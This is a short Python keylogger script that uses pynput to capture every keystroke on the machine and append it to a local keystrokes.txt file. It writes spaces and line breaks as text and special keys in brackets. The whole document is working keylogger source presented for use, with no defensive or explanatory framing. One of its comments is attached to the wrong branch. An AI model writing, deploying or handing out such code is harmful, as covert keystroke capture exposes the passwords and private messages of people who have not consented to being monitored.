from pynput.keyboard import Listener

# File path where the keystrokes will be logged
log_file = "keystrokes.txt"

# Function to write keystrokes to the file
def write_to_file(key):
    # Open the log file in append mode
    with open(log_file, "a") as f:
        # Remove unnecessary quotes and format key
        k = str(key).replace("'", "")
        if k == "Key.space":
            f.write(" ")
        elif k == "Key.enter":
            f.write("\n")
        elif "Key" not in k:  # Ignore special keys (like 'Key.shift')
            f.write(k)
        else:
            f.write(f"[{k}]")  # Write special keys in brackets

# Function called whenever a key is pressed
def on_press(key):
    write_to_file(key)

# Set up and start the keylogger listener
with Listener(on_press=on_press) as listener:
    listener.join()
